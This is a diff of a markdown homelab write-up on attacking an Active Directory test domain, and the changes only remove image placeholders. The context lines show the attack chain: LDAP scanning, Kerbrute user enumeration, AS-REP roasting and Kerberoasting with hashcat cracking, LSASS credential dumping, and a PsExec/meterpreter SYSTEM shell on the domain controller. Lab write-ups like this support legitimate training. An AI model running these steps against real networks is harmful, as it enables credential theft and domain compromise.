@@ -24,9 +24,6 @@ nmap -sV --script=ldap* 192.168.10.19
 - Port 389 = LDAP = Active Directory
 - Port 3268 = Global Catalog
 
-!image.png
-
-!image.png
 
 <aside>
 💡
@@ -60,9 +57,6 @@ net user sqlservice Password123! /add /domain
 setspn -S MSSQLSvc/sqlservice.testlab.local:1433 testlab\sqlservice
 ```
 
-!image.png
-
-!image.png
 
 #### **Join Windows 7 to domain:**
 
@@ -70,7 +64,6 @@ setspn -S MSSQLSvc/sqlservice.testlab.local:1433 testlab\sqlservice
 - Domain: testlab.local
 - Use Administrator credentials
 
-!image.png
 
 #### Enumerate users with Kerbrute
 
@@ -80,7 +73,6 @@ kerbrute userenum  --dc 192.168.10.19  --domain testlab.local /usr/share/wordlis
 
 **Also try different wordlist’s , to get better result’s**
 
-!image.png
 
 ### Step - 3 : AS-REP Roasting
 
@@ -106,7 +98,6 @@ OR
 GetNPUsers.py testlab.local/testuser -dc-ip 192.168.10.19 -no-pass -request -outputfile asrep_hash.txt
 ```
 
-!image.png
 
 #### **Crack with Hashcat:**
 
@@ -114,7 +105,6 @@ GetNPUsers.py testlab.local/testuser -dc-ip 192.168.10.19 -no-pass -request -out
 hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-!image.png
 
 **Custom wordlist if rockyou fails:**
 
@@ -155,7 +145,6 @@ Use **`GetNPUsers.py`** (No Password) for AS-REP Roasting first, then use **`Get
 
 </aside>
 
-!image.png
 
 #### **Crack with Hashcat:**
 
@@ -163,7 +152,6 @@ Use **`GetNPUsers.py`** (No Password) for AS-REP Roasting first, then use **`Get
 hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
-!image.png
 
 **Hashcat modes reference:**
 
@@ -196,7 +184,6 @@ on older systems.
 Successfully recovered Domain Administrator
 cleartext credentials from LSASS memory.
 
-!Load_Kiwi.png
 
 ### Step - 6 :  Lateral Movement to Domain Controller
 
@@ -208,7 +195,6 @@ nxc smb 192.168.10.19 -u Administrator -p 'YourPassword' -d TESTLAB
 
 **Look for:** `Pwn3d!` = you have admin access
 
-!image.png
 
  **2 — Get shell on DC with PsExec:**
 
@@ -231,6 +217,5 @@ getuid          # NT AUTHORITY\SYSTEM
 sysinfo         # shows DC01 hostname
 ```
 
-!image.png
 
 # Full Attack Chain Summary
